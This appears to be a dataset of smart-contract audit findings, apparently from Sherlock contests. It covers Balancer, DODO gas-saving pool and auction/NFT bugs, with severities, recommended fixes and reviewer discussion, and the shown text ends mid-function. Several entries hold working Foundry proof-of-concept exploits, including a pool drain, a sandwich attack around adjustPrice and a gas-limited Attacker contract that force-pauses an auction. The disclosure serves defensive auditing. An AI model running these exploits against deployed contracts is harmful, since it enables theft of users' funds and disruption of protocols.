suggestedчsome category can't get `Reserves`\nCode Snippet\nTool used\nManual Review
Possible incorrect price for tokens in Balancer stable pool due to amplification parameter updateчmediumч```\n            function getTokenPriceFromStablePool(\n        address lookupToken_,\n        uint8 outputDecimals_,\n        bytes calldata params_\n    ) external view returns (uint256) {\n\n                // rest of code..\n\n                try pool.getLastInvariant() returns (uint256, uint256 ampFactor) {\n                   \n                   // @audit the amplification factor as of the last invariant calculation is used\n                    lookupTokensPerDestinationToken = StableMath._calcOutGivenIn(\n                        ampFactor,\n                        balances_,\n                        destinationTokenIndex,\n                        lookupTokenIndex,\n                        1e18,\n                        StableMath._calculateInvariant(ampFactor, balances_) // Sometimes the fetched invariant value does not work, so calculate it\n                    );\n```\nчIncorrect price calculation of tokens in StablePools if amplification factor is being updated\nThe amplification parameter used to calculate the invariant can be in a state of update. In such a case, the current amplification parameter can differ from the amplificaiton parameter at the time of the last invariant calculation. The current implementaiton of `getTokenPriceFromStablePool` doesn't consider this and always uses the amplification factor obtained by calling `getLastInvariant`\n```\n            function getTokenPriceFromStablePool(\n        address lookupToken_,\n        uint8 outputDecimals_,\n        bytes calldata params_\n    ) external view returns (uint256) {\n\n                // rest of code..\n\n                try pool.getLastInvariant() returns (uint256, uint256 ampFactor) {\n                   \n                   // @audit the amplification factor as of the last invariant calculation is used\n                    lookupTokensPerDestinationToken = StableMath._calcOutGivenIn(\n                        ampFactor,\n                        balances_,\n                        destinationTokenIndex,\n                        lookupTokenIndex,\n                        1e18,\n                        StableMath._calculateInvariant(ampFactor, balances_) // Sometimes the fetched invariant value does not work, so calculate it\n                    );\n```\n\n```\n        // @audit the amplification parameter can be updated\n        function startAmplificationParameterUpdate(uint256 rawEndValue, uint256 endTime) external authenticate {\n\n        // @audit for calculating the invariant the current amplification factor is obtained by calling _getAmplificationParameter()\n        function _onSwapGivenIn(\n        SwapRequest memory swapRequest,\n        uint256[] memory balances,\n        uint256 indexIn,\n        uint256 indexOut\n    ) internal virtual override whenNotPaused returns (uint256) {\n        (uint256 currentAmp, ) = _getAmplificationParameter();\n        uint256 amountOut = StableMath._calcOutGivenIn(currentAmp, balances, indexIn, indexOut, swapRequest.amount);\n        return amountOut;\n    }\n```\nч"Use the latest amplification factor by callling the `getAmplificationParameter` function\nDiscussion\n0xJem\nThis doesn't seem valid - if the amplification factor is changed since the invariant was last calculated, wouldn't the value of the invariant also be invalid?\nnevillehuang\nHi @0xJem here is additional information provided by watson:\nThe invariant used for calculating swap amounts in Balancer is always based on the latest amplification factor hence their calculation would be latest. If there are no join actions, the cached amplification factor which is used by Olympus will not reflect the new one and will result in a different invariant and different token price.\ni am attaching a poc if required: https://gist.github.com/10xhash/8e24d0765ee98def8c6409c71a7d2b17\n0xauditsea\nEscalate\nThis looks like invalid. Logically thinking, using `getLastInvariant` is more precise because the goal of this price feed is to calculate spot price of the balancer pool. If current amplification factor is used, it doesn't represent current state of the pool.\nsherlock-admin2\nEscalate\nThis looks like invalid. Logically thinking, using `getLastInvariant` is more precise because the goal of this price feed is to calculate spot price of the balancer pool. If current amplification factor is used, it doesn't represent current state of the pool.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nCzar102\n@nevillehuang what do you think?\nnevillehuang\n@Czar102 I don't quite understand what @0xauditsea is pointing to. If you want to calculate the latest spot price, shouldn't you use the latest factor as indicated by the PoC by @10xhash?\nCzar102\n@0xauditsea could you explain your reasoning in more detail?\nnevillehuang\n@10xhash does this affect ALL pools intended to be integrated during the time of contest?\n10xhash\nIt has to be clarified what `intended to be integrated pools` at the time of contest are:\nIf only the list of tokens mentioned in the readme can be in a pool ( as mentioned in previous replies this is not required per the contest definition since all tokens are not required to interact with contracts ) : There are 0 stable pools including normal, metastable etc. The only possible stable pool of any type that can be used with the above restriction is the dai-sdai metastable pool which has to be deployed in future.\nElse it must atleast include normal stable pools and according to balancer's documentation {search startAmplificationParameterUpdate} and testing done on the dai-usdc-usdt pool, it would be affected\nCzar102\nMetastable pools are not supposed to be supported.\nThis documentation seems to be for Avalanche, while the contracts will be deployed on mainnet. I believe this functionality exists on mainnet too, right?\nAside from that, the impact is that the price calculated is the price at the last pool update (trade) instead of the current price?\n10xhash\nThe link opens up to Mainnet for me, if not you would have the option to select the chain on leftside. Yes.\nThe impact would be that the amplification parameter used in the price calculation will be that of the last join action (addliquidity , removeliquidity) which will be different from the actual one used in the pool calculations. This will result in an incorrect price until some user performs a join operation.\nCzar102\nAdding/removing liquidity doesn't necessarily happen often. This, together with the amplification parameter change, is a very unlikely situation, nevertheless a possible one.\nIt's a borderline Med/Low, but I am inclined to keep this one a valid Medium. I don't understand the point made in the escalation, and @0xauditsea hasn't elaborated when asked for additional information.\ngstoyanovbg\n```\nfunction test_amp_factor_impact() public {\n        bytes memory params = encodeBalancerPoolParams(mockStablePool);\n        uint256 price;\n\n        mockStablePool.setLastInvariant(INVARIANT, AMP_FACTOR);\n        price = balancerSubmodule.getTokenPriceFromStablePool(\n            AURA_BAL,\n            PRICE_DECIMALS,\n            params\n        );\n        console.log(""%d, AMP_FACTOR = 50000"", price);\n\n        mockStablePool.setLastInvariant(INVARIANT, AMP_FACTOR + 2000);\n        price = balancerSubmodule.getTokenPriceFromStablePool(\n            AURA_BAL,\n            PRICE_DECIMALS,\n            params\n        );\n        console.log(""%d, AMP_FACTOR = 50000 + 2000"", price);\n\n        mockStablePool.setLastInvariant(INVARIANT, AMP_FACTOR + 10000);\n        price = balancerSubmodule.getTokenPriceFromStablePool(\n            AURA_BAL,\n            PRICE_DECIMALS,\n            params\n        );\n        console.log(""%d, AMP_FACTOR = 50000 + 10000"", price);\n\n        mockStablePool.setLastInvariant(INVARIANT, AMP_FACTOR * 2);\n        price = balancerSubmodule.getTokenPriceFromStablePool(\n            AURA_BAL,\n            PRICE_DECIMALS,\n            params\n        );\n        console.log(""%d, AMP_FACTOR = 50000 * 2"", price);\n\n        mockStablePool.setLastInvariant(INVARIANT, AMP_FACTOR * 4);\n        price = balancerSubmodule.getTokenPriceFromStablePool(\n            AURA_BAL,\n            PRICE_DECIMALS,\n            params\n        );\n        console.log(""%d, AMP_FACTOR = 50000 * 4"", price);\n\n        mockStablePool.setLastInvariant(INVARIANT, AMP_FACTOR * 10);\n        price = balancerSubmodule.getTokenPriceFromStablePool(\n            AURA_BAL,\n            PRICE_DECIMALS,\n            params\n        );\n        console.log(""%d, AMP_FACTOR = 50000 * 10"", price);\n\n        mockStablePool.setLastInvariant(INVARIANT, AMP_FACTOR * 100);\n        price = balancerSubmodule.getTokenPriceFromStablePool(\n            AURA_BAL,\n            PRICE_DECIMALS,\n            params\n        );\n        console.log(""%d, AMP_FACTOR = 50000 * 100"", price);\n    }\n```\n\n16602528871962134544, AMP_FACTOR = 50000 16606565178508667081, AMP_FACTOR = 50000 + 2000 16620074517406602667, AMP_FACTOR = 50000 + 10000 16655599693391809126, AMP_FACTOR = 50000 * 2 16682630482761745824, AMP_FACTOR = 50000 * 4 16699011129392628938, AMP_FACTOR = 50000 * 10 16708898633935285195, AMP_FACTOR = 50000 * 100\nFrom the obtained results, it can be seen that the change in price is small. Even if we increase it 100 times to the maximum possible value of 5000 * 10^3, the change in price is around 0.1 (0.63%). For such a large increase of the amplification factor, it would take about 7 days (2x per day). Another question is what is the chance that there will be no join or exit within these 7 days.\n@Czar102 I don't know if this is significant enough change in the price for Sherlock, but wanted to share it to be sure it will be taken into consideration.\nCzar102\n@gstoyanovbg Thank you for the test, it looks like this should be a low severity issue.\n@10xhash Can you provide a scenario where the price would be altered by more than 5%?\n10xhash\nPlace the test inside test/ and run `forge test --mt testHash_AmplificationDiff5` It is asserted that the diff in price is > 5% when the current amplification parameter is divided by 6 with a 4 day period. Dividing by 6 would make the pool close to 8000 (currently 50000).\ngstoyanovbg\n@10xhash well done, i think your test is valid and shows a significant price change.\nCzar102\nThank you @10xhash! Planning to leave the issue as is.\nCzar102\nResult: Medium Unique\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\n0xauditsea: rejected"чIn case the amplification parameter of a pool is being updated by the admin, wrong price will be calculated.\nCode Snippet\nTool used\nManual Review
Pool can be drained if there are no LP_FEESчhighч"```\nfunction test_poolCanBeDrained() public {\n        // @review 99959990000000000000000 this amount makes the reserve 0\n        // run a fuzz test, to get the logs easily I will just use this value as constant but I found it via fuzzing\n        // selling this amount to the pool will make the quote token reserves ""0"".\n        vm.startPrank(tapir);\n        uint256 _amount = 99959990000000000000000;\n\n        //  Buy shares with tapir, 10 - 10 initiate the pool\n        dai.transfer(address(gsp), 10 * 1e18);\n        usdc.transfer(address(gsp), 10 * 1e6);\n        gsp.buyShares(tapir);\n\n        // make sure the values are correct with my math\n        assertTrue(gsp._BASE_RESERVE_() == 10 * 1e18);\n        assertTrue(gsp._QUOTE_RESERVE_() == 10 * 1e6);\n        assertTrue(gsp._BASE_TARGET_() == 10 * 1e18);\n        assertTrue(gsp._QUOTE_TARGET_() == 10 * 1e6);\n        assertEq(gsp.balanceOf(tapir), 10 * 1e18);\n        vm.stopPrank();\n        \n        // sell such a base token amount such that the quote reserve is 0\n        // I calculated the ""_amount"" already which will make the quote token reserve ""0""\n        vm.startPrank(hippo);\n        deal(DAI, hippo, _amount);\n        dai.transfer(address(gsp), _amount);\n        uint256 receivedQuoteAmount = gsp.sellBase(hippo);\n\n        // print the reserves and the amount received by hippo when he sold the base tokens\n        console.log(""Received quote amount by hippo"", receivedQuoteAmount);\n        console.log(""Base reserve"", gsp._BASE_RESERVE_());\n        console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n\n        // Quote reserve is 0!!! That means the pool has 0 assets, basically pool has only one asset now!\n        // this behaviour is almost always not a desired behaviour because we never want our assets to be 0 \n        // as a result of swapping or removing liquidity.\n        assertEq(gsp._QUOTE_RESERVE_(), 0);\n\n        // sell the quote tokens received back to the pool immediately\n        usdc.transfer(address(gsp), receivedQuoteAmount);\n\n        // cache whatever received base tokens from the selling back\n        uint256 receivedBaseAmount = gsp.sellQuote(hippo);\n\n        console.log(""Received base amount by hippo"", receivedBaseAmount);\n        console.log(""Base target"", gsp._BASE_TARGET_());\n        console.log(""Quote target"", gsp._QUOTE_TARGET_());\n        console.log(""Base reserve"", gsp._BASE_RESERVE_());\n        console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n        \n        // whatever received in base tokens are bigger than our first flashloan! \n        // means that we have a profit!\n        assertGe(receivedBaseAmount, _amount);\n        console.log(""Profit for attack"", receivedBaseAmount - _amount);\n    }\n```\n"ч"The pool can be depleted because swaps allow the withdrawal of the entire balance, resulting in a reserve of 0 for a specific asset. When an asset's balance reaches 0, the PMMPricing algorithm incorrectly estimates the calculation of output amounts. Consequently, the entire pool can be exploited using a flash loan by depleting one of the tokens to 0 and then swapping back to the pool whatever is received.\nFirstly, as indicated in the summary, selling quote/base tokens can lead to draining the opposite token in the pool, potentially resulting in a reserve of 0. Consequently, the swapping mechanism permits someone to entirely deplete the token balance within the pool. In such cases, the calculations within the pool mechanism become inaccurate. Therefore, swapping back to whatever has been initially purchased will result in acquiring more tokens, further exacerbating the depletion of the pool.\nAllow me to provide a PoC to illustrate this scenario:\n```\nfunction test_poolCanBeDrained() public {\n        // @review 99959990000000000000000 this amount makes the reserve 0\n        // run a fuzz test, to get the logs easily I will just use this value as constant but I found it via fuzzing\n        // selling this amount to the pool will make the quote token reserves ""0"".\n        vm.startPrank(tapir);\n        uint256 _amount = 99959990000000000000000;\n\n        //  Buy shares with tapir, 10 - 10 initiate the pool\n        dai.transfer(address(gsp), 10 * 1e18);\n        usdc.transfer(address(gsp), 10 * 1e6);\n        gsp.buyShares(tapir);\n\n        // make sure the values are correct with my math\n        assertTrue(gsp._BASE_RESERVE_() == 10 * 1e18);\n        assertTrue(gsp._QUOTE_RESERVE_() == 10 * 1e6);\n        assertTrue(gsp._BASE_TARGET_() == 10 * 1e18);\n        assertTrue(gsp._QUOTE_TARGET_() == 10 * 1e6);\n        assertEq(gsp.balanceOf(tapir), 10 * 1e18);\n        vm.stopPrank();\n        \n        // sell such a base token amount such that the quote reserve is 0\n        // I calculated the ""_amount"" already which will make the quote token reserve ""0""\n        vm.startPrank(hippo);\n        deal(DAI, hippo, _amount);\n        dai.transfer(address(gsp), _amount);\n        uint256 receivedQuoteAmount = gsp.sellBase(hippo);\n\n        // print the reserves and the amount received by hippo when he sold the base tokens\n        console.log(""Received quote amount by hippo"", receivedQuoteAmount);\n        console.log(""Base reserve"", gsp._BASE_RESERVE_());\n        console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n\n        // Quote reserve is 0!!! That means the pool has 0 assets, basically pool has only one asset now!\n        // this behaviour is almost always not a desired behaviour because we never want our assets to be 0 \n        // as a result of swapping or removing liquidity.\n        assertEq(gsp._QUOTE_RESERVE_(), 0);\n\n        // sell the quote tokens received back to the pool immediately\n        usdc.transfer(address(gsp), receivedQuoteAmount);\n\n        // cache whatever received base tokens from the selling back\n        uint256 receivedBaseAmount = gsp.sellQuote(hippo);\n\n        console.log(""Received base amount by hippo"", receivedBaseAmount);\n        console.log(""Base target"", gsp._BASE_TARGET_());\n        console.log(""Quote target"", gsp._QUOTE_TARGET_());\n        console.log(""Base reserve"", gsp._BASE_RESERVE_());\n        console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n        \n        // whatever received in base tokens are bigger than our first flashloan! \n        // means that we have a profit!\n        assertGe(receivedBaseAmount, _amount);\n        console.log(""Profit for attack"", receivedBaseAmount - _amount);\n    }\n```\n\nTest results and logs:"чDo not allow the pools balance to be 0 or do not let LP_FEE to be 0 in anytime.\nDiscussion\nsherlock-admin2\nEscalate\nIssues #51, #96 and #157 are missing the crucial second step of swapping back to actually drain the pool, and thus describe a low impact. They should be unduplicated from this issue\n```\nYou've deleted an escalation for this issue.\n```\n\nnevillehuang\n@CergyK those are not duplicates, I have removed them already. You might want to remove the escalation.\nCergyK\n@CergyK those are not duplicates, I have removed them already. You might want to remove the escalation.\nThank you, escalation removed\nSkyewwww\nWe have fixed this bug at this PR: https://github.com/DODOEX/dodo-gassaving-pool/pull/15ч"Pool can be drained, funds are lost. Hence, high. Though, this can only happen when there are no ""LP_FEES"". However, when we check the default settings of the deployment, we see here that the LP_FEE is set to 0. So, it is ok to assume that the LP_FEES can be 0.\nCode Snippet\nTool used\nManual Review"
Adjusting ""_I_"" will create a sandwich opportunity because of price changes"чmediumч"```\nfunction test_Adjusting_I_CanBeFrontrunned() external {\n        vm.startPrank(tapir);\n\n        //  Buy shares with tapir, 10 - 10\n        dai.safeTransfer(address(gsp), 10 * 1e18);\n        usdc.transfer(address(gsp), 10 * 1e6);\n        gsp.buyShares(tapir);\n\n        // print some stuff\n        console.log(""Base target initial"", gsp._BASE_TARGET_());\n        console.log(""Quote target initial"", gsp._QUOTE_TARGET_());\n        console.log(""Base reserve initial"", gsp._BASE_RESERVE_());\n        console.log(""Quote reserve initial"", gsp._QUOTE_RESERVE_());\n        \n        // we know the price will decrease so lets sell the base token before that\n        uint256 initialBaseTokensSwapped = 5 * 1e18;\n\n        // sell the base tokens before adjustPrice\n        dai.safeTransfer(address(gsp), initialBaseTokensSwapped);\n        uint256 receivedQuoteTokens = gsp.sellBase(tapir);\n        vm.stopPrank();\n\n        // this is the tx will be sandwiched by the MEV trader\n        vm.prank(MAINTAINER);\n        gsp.adjustPrice(999000);\n\n        // quickly resell whatever gained by the price update\n        vm.startPrank(tapir);\n        usdc.safeTransfer(address(gsp), receivedQuoteTokens);\n        uint256 receivedBaseTokens = gsp.sellQuote(tapir);\n        console.log(""Base target"", gsp._BASE_TARGET_());\n        console.log(""Quote target"", gsp._QUOTE_TARGET_());\n        console.log(""Base reserve"", gsp._BASE_RESERVE_());\n        console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n        console.log(""Received base tokens"", receivedBaseTokens);\n\n        // NOTE: the LP fee and MT FEE is set for this example, so this is not an rough assumption\n        // where fees are 0. Here the fees set for both of the values (default values):\n        // uint256 constant LP_FEE_RATE = 10000000000000;\n        // uint256 constant MT_FEE_RATE = 10000000000000;\n\n        // whatever we get is more than we started, in this example\n        // MEV trader started 5 DAI and we have more than 5 DAI!!\n        assertGe(receivedBaseTokens, initialBaseTokensSwapped);\n    }\n```\n"ч"Adjusting the value of ""I"" directly influences the price. This can be exploited by a MEV bot, simply by trading just before the ""adjustPrice"" function and exiting right after the price change. The profit gained from this operation essentially represents potential losses for the liquidity providers who supplied liquidity to the pool.\nAs we can see in the docs, the ""I"" is the ""i"" value in here and it is directly related with the output amount a trader will receive when selling a quote/base token:\nSince the price will change, the MEV bot can simply sandwich the tx. Here an example how it can be executed by a MEV bot:\n```\nfunction test_Adjusting_I_CanBeFrontrunned() external {\n        vm.startPrank(tapir);\n\n        //  Buy shares with tapir, 10 - 10\n        dai.safeTransfer(address(gsp), 10 * 1e18);\n        usdc.transfer(address(gsp), 10 * 1e6);\n        gsp.buyShares(tapir);\n\n        // print some stuff\n        console.log(""Base target initial"", gsp._BASE_TARGET_());\n        console.log(""Quote target initial"", gsp._QUOTE_TARGET_());\n        console.log(""Base reserve initial"", gsp._BASE_RESERVE_());\n        console.log(""Quote reserve initial"", gsp._QUOTE_RESERVE_());\n        \n        // we know the price will decrease so lets sell the base token before that\n        uint256 initialBaseTokensSwapped = 5 * 1e18;\n\n        // sell the base tokens before adjustPrice\n        dai.safeTransfer(address(gsp), initialBaseTokensSwapped);\n        uint256 receivedQuoteTokens = gsp.sellBase(tapir);\n        vm.stopPrank();\n\n        // this is the tx will be sandwiched by the MEV trader\n        vm.prank(MAINTAINER);\n        gsp.adjustPrice(999000);\n\n        // quickly resell whatever gained by the price update\n        vm.startPrank(tapir);\n        usdc.safeTransfer(address(gsp), receivedQuoteTokens);\n        uint256 receivedBaseTokens = gsp.sellQuote(tapir);\n        console.log(""Base target"", gsp._BASE_TARGET_());\n        console.log(""Quote target"", gsp._QUOTE_TARGET_());\n        console.log(""Base reserve"", gsp._BASE_RESERVE_());\n        console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n        console.log(""Received base tokens"", receivedBaseTokens);\n\n        // NOTE: the LP fee and MT FEE is set for this example, so this is not an rough assumption\n        // where fees are 0. Here the fees set for both of the values (default values):\n        // uint256 constant LP_FEE_RATE = 10000000000000;\n        // uint256 constant MT_FEE_RATE = 10000000000000;\n\n        // whatever we get is more than we started, in this example\n        // MEV trader started 5 DAI and we have more than 5 DAI!!\n        assertGe(receivedBaseTokens, initialBaseTokensSwapped);\n    }\n```\n\nTest result and logs:\nAfter the sandwich, we can see that the MEV bot's DAI amount exceeds its initial DAI balance (profits). Additionally, the reserves for both base and quote tokens are less than the initial 10 tokens deposited by the tapir (only LP). The profit gained by the MEV bot essentially translates to a loss for the tapir.\nAnother note on this is that even though the `adjustPrice` called by MAINTAINER without getting frontrunned, it still creates a big price difference which requires immediate arbitrages. Usually these type of parameter changes that impacts the trades are setted by time via ramping to mitigate the unfair advantages that it can occur during the price update."ч"Acknowledge the issue and use private RPC's to eliminate front-running or slowly ramp up the ""I"" so that the arbitrage opportunity is fair\nDiscussion\nSkyewwww\nWe think this is normal arbitrage behavior and not a bug.\nnevillehuang\n@Skyewwww Since this wasn't mention as an intended known risk, I will maintain as medium severity."чMedium since the adjusting price is a privileged role and it is not frequently used. However, this tx can be frontrunnable easily as we see in the PoC which would result in loss of funds. Although the admins are trusted this is not about admin being trustworthy. This is basically a common DeFi parameter change thread and should be well awared. For example, in curve/yeth/balancer contracts the ramp factors are changed via async slow update. It doesn't changes its value immediately but rather does this update slowly by every sec. For example we can see here in the yETH contract that the changing a parameter which determines the trades of users is updated slowly rather than one go: https://github.com/yearn/yETH/blob/8d831fd6b4de9f004d419f035cd2806dc8d5cf7e/contracts/Pool.vy#L983-L997\nCode Snippet\nTool used\nManual Review
First depositor can lock the quote target value to zeroчmediumч```\n if (totalSupply == 0) {\n            // case 1. initial supply\n            // The shares will be minted to user\n            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_)\n                ? DecimalMath.divFloor(quoteBalance, _I_)\n                : baseBalance;\n            // The target will be updated\n            _BASE_TARGET_ = uint112(shares);\n            _QUOTE_TARGET_ = uint112(DecimalMath.mulFloor(shares, _I_));\n```\nч"When the initial deposit occurs, it is possible for the quote target to be set to 0. This situation significantly impacts other LPs as well. Even if subsequent LPs deposit substantial amounts, the quote target remains at 0 due to multiplication with this zero value. 0 QUOTE_TARGET value will impact the swaps that pool facilities\nWhen the first deposit happens, QUOTE_TARGET is set as follows:\n```\n if (totalSupply == 0) {\n            // case 1. initial supply\n            // The shares will be minted to user\n            shares = quoteBalance < DecimalMath.mulFloor(baseBalance, _I_)\n                ? DecimalMath.divFloor(quoteBalance, _I_)\n                : baseBalance;\n            // The target will be updated\n            _BASE_TARGET_ = uint112(shares);\n            _QUOTE_TARGET_ = uint112(DecimalMath.mulFloor(shares, _I_));\n```\n\nIn this scenario, the 'shares' value can be a minimum of 1e3, as indicated here: link to code snippet.\nThis implies that if someone deposits minuscule amounts of quote token and base token, they can set the QUOTE_TARGET to zero because the `mulFloor` operation uses a scaling factor of 1e18:\n```\nfunction mulFloor(uint256 target, uint256 d) internal pure returns (uint256) {\n        return target * d / (10 ** 18);\n    }\n```\n\n```\n// @review 0 + (0 * something) = 0! doesn't matter what amount has been deposited !\n_QUOTE_TARGET_ = uint112(uint256(_QUOTE_TARGET_) + (DecimalMath.mulFloor(uint256(_QUOTE_TARGET_), mintRatio)));\n```\n\nHere a PoC shows that if the first deposit is tiny the QUOTE_TARGET is 0. Also, whatever deposits after goes through the QUOTE_TARGET still 0 because of the multiplication with 0!\n```\nfunction test_StartWithZeroTarget() external {\n        // tapir deposits tiny amounts to make quote target 0\n        vm.startPrank(tapir);\n        dai.safeTransfer(address(gsp), 1 * 1e5);\n        usdc.transfer(address(gsp), 1 * 1e5);\n        gsp.buyShares(tapir);\n\n        console.log(""Base target"", gsp._BASE_TARGET_());\n        console.log(""Quote target"", gsp._QUOTE_TARGET_());\n        console.log(""Base reserve"", gsp._BASE_RESERVE_());\n        console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n\n        // quote target is indeed 0!\n        assertEq(gsp._QUOTE_TARGET_(), 0);\n\n        vm.stopPrank();\n\n        // hippo deposits properly\n        vm.startPrank(hippo);\n        dai.safeTransfer(address(gsp), 1000 * 1e18);\n        usdc.transfer(address(gsp), 10000 * 1e6);\n        gsp.buyShares(hippo);\n\n        console.log(""Base target"", gsp._BASE_TARGET_());\n        console.log(""Quote target"", gsp._QUOTE_TARGET_());\n        console.log(""Base reserve"", gsp._BASE_RESERVE_());\n        console.log(""Quote reserve"", gsp._QUOTE_RESERVE_());\n\n        // although hippo deposited 1000 USDC as quote tokens, target is still 0 due to multiplication with 0\n        assertEq(gsp._QUOTE_TARGET_(), 0);\n    }\n```\n\nTest result and logs:"чAccording to the quote tokens decimals, multiply the quote token balance with the proper decimal scalor.\nDiscussion\nSkyewwww\nWhen Q0=0, users can still call sellQuote which can be executed normally. When user calls sellBase, the target will be check. If target is not greater than 0, the transaction will be revert as we expected.чSince the quote target is important and used when pool deciding the swap math I will label this as high.\nCode Snippet\nTool used\nManual Review
Attacker can force pause the Auction contract.чmediumч```\nfunction _createAuction() private returns (bool) {\n // Get the next token available for bidding\n try token.mint() returns (uint256 tokenId) {\n  // Store the token id\n  auction.tokenId = tokenId;\n\n  // Cache the current timestamp\n  uint256 startTime = block.timestamp;\n\n  // Used to store the auction end time\n  uint256 endTime;\n\n  // Cannot realistically overflow\n  unchecked {\n   // Compute the auction end time\n   endTime = startTime + settings.duration;\n  }\n\n  // Store the auction start and end time\n  auction.startTime = uint40(startTime);\n  auction.endTime = uint40(endTime);\n\n  // Reset data from the previous auction\n  auction.highestBid = 0;\n  auction.highestBidder = address(0);\n  auction.settled = false;\n\n  // Reset referral from the previous auction\n  currentBidReferral = address(0);\n\n  emit AuctionCreated(tokenId, startTime, endTime);\n  return true;\n } catch {\n  // Pause the contract if token minting failed\n  _pause();\n  return false;\n }\n}\n```\nч"In certain situations (e.g founders have ownership percentage greater than 51) an attacker can potentially exploit the `try catch` within the `Auction._CreateAuction()` function to arbitrarily pause the auction contract.\nConsider the code from `Auction._CreateAuction()` function, which is called by `Auction.settleCurrentAndCreateNewAuction()`. It first tries to mint a new token for the auction, and if the minting fails the `catch` branch will be triggered, pausing the auction.\n```\nfunction _createAuction() private returns (bool) {\n // Get the next token available for bidding\n try token.mint() returns (uint256 tokenId) {\n  // Store the token id\n  auction.tokenId = tokenId;\n\n  // Cache the current timestamp\n  uint256 startTime = block.timestamp;\n\n  // Used to store the auction end time\n  uint256 endTime;\n\n  // Cannot realistically overflow\n  unchecked {\n   // Compute the auction end time\n   endTime = startTime + settings.duration;\n  }\n\n  // Store the auction start and end time\n  auction.startTime = uint40(startTime);\n  auction.endTime = uint40(endTime);\n\n  // Reset data from the previous auction\n  auction.highestBid = 0;\n  auction.highestBidder = address(0);\n  auction.settled = false;\n\n  // Reset referral from the previous auction\n  currentBidReferral = address(0);\n\n  emit AuctionCreated(tokenId, startTime, endTime);\n  return true;\n } catch {\n  // Pause the contract if token minting failed\n  _pause();\n  return false;\n }\n}\n```\n\nDue to the internal logic of the `mint` function, if there are founders with high ownership percentages, many tokens can be minted to them during calls to mintas part of the vesting mechanism. As a consequence of this under some circumstances calls to `mint` can consume huge amounts of gas.\nCurrently on Ethereum and EVM-compatible chains, calls can consume at most 63/64 of the parent's call gas (See EIP-150). An attacker can exploit this circumstances of high gas cost to restrict the parent gas call limit, making `token.mint()` fail and still leaving enough gas left (1/64) for the `_pause()` call to succeed. Therefore he is able to force the pausing of the auction contract at will.\nBased on the gas requirements (1/64 of the gas calls has to be enough for `_pause()` gas cost of 21572), then `token.mint()` will need to consume at least 1359036 gas (63 * 21572), consequently it is only possible on some situations like founders with high percentage of vesting, for example 51 or more.\nConsider the following POC. Here we are using another contract to restrict the gas limit of the call, but this can also be done with an EOA call from the attacker.\nExploit contract code:\n```\npragma solidity ^0.8.16;\n\ncontract Attacker {\n    function forcePause(address target) external {\n        bytes4 selector = bytes4(keccak256(""settleCurrentAndCreateNewAuction()""));\n        assembly {\n            let ptr := mload(0x40)\n            mstore(ptr,selector)\n            let success := call(1500000, target, 0, ptr, 4, 0, 0)\n        }\n    }\n}\n```\n\nPOC:"ч"
when reservedUntilTokenId > 100 first funder loss 1% NFTчhighч```\n    function _addFounders(IManager.FounderParams[] calldata _founders, uint256 reservedUntilTokenId) internal {\n// rest of code\n\n                // Used to store the base token id the founder will recieve\n              uint256 baseTokenId = reservedUntilTokenId;\n\n                // For each token to vest:\n                for (uint256 j; j < founderPct; ++j) {\n                    // Get the available token id\n                    baseTokenId = _getNextTokenId(baseTokenId);\n\n                    // Store the founder as the recipient\n                    tokenRecipient[baseTokenId] = newFounder;\n\n                    emit MintScheduled(baseTokenId, founderId, newFounder);\n\n                    // Update the base token id\n                    baseTokenId = (baseTokenId + schedule) % 100;\n                }\n            }\n..\n\n    function _getNextTokenId(uint256 _tokenId) internal view returns (uint256) {\n        unchecked {\n          while (tokenRecipient[_tokenId].wallet != address(0)) {\n                _tokenId = (++_tokenId) % 100;\n            }\n\n            return _tokenId;\n        }\n    }\n```\nчThe incorrect use of `baseTokenId = reservedUntilTokenId` may result in the first `tokenRecipient[]` being invalid, thus preventing the founder from obtaining this portion of the NFT.\nThe current protocol adds a parameter `reservedUntilTokenId` for reserving `Token`. This parameter will be used as the starting `baseTokenId` during initialization.\n```\n    function _addFounders(IManager.FounderParams[] calldata _founders, uint256 reservedUntilTokenId) internal {\n// rest of code\n\n                // Used to store the base token id the founder will recieve\n              uint256 baseTokenId = reservedUntilTokenId;\n\n                // For each token to vest:\n                for (uint256 j; j < founderPct; ++j) {\n                    // Get the available token id\n                    baseTokenId = _getNextTokenId(baseTokenId);\n\n                    // Store the founder as the recipient\n                    tokenRecipient[baseTokenId] = newFounder;\n\n                    emit MintScheduled(baseTokenId, founderId, newFounder);\n\n                    // Update the base token id\n                    baseTokenId = (baseTokenId + schedule) % 100;\n                }\n            }\n..\n\n    function _getNextTokenId(uint256 _tokenId) internal view returns (uint256) {\n        unchecked {\n          while (tokenRecipient[_tokenId].wallet != address(0)) {\n                _tokenId = (++_tokenId) % 100;\n            }\n\n            return _tokenId;\n        }\n    }\n```\n\nBecause `baseTokenId = reservedUntilTokenId` is used, if `reservedUntilTokenId>100`, for example, reservedUntilTokenId=200, the first `_getNextTokenId(200)` will return `baseTokenId=200 , tokenRecipient[200]=newFounder`.\nExample: reservedUntilTokenId = 200 founder[0].founderPct = 10\nIn this way, the `tokenRecipient[]` of `founder` will become tokenRecipient[200].wallet = `founder` ( first will call _getNextTokenId(200) return 200) tokenRecipient[10].wallet = `founder` ( second will call _getNextTokenId((200 + 10) %100 = 10) ) tokenRecipient[20].wallet = `founder` ... tokenRecipient[90].wallet = `founder`\nHowever, this `tokenRecipient[200]` will never be used, because in `_isForFounder()`, it will be modulo, so only `baseTokenId < 100` is valid. In this way, the first founder can actually only `9%` of NFT.\n```\n    function _isForFounder(uint256 _tokenId) private returns (bool) {\n        // Get the base token id\n      uint256 baseTokenId = _tokenId % 100;\n\n        // If there is no scheduled recipient:\n        if (tokenRecipient[baseTokenId].wallet == address(0)) {\n            return false;\n\n            // Else if the founder is still vesting:\n        } else if (block.timestamp < tokenRecipient[baseTokenId].vestExpiry) {\n            // Mint the token to the founder\n          _mint(tokenRecipient[baseTokenId].wallet, _tokenId);\n\n            return true;\n\n            // Else the founder has finished vesting:\n        } else {\n            // Remove them from future lookups\n            delete 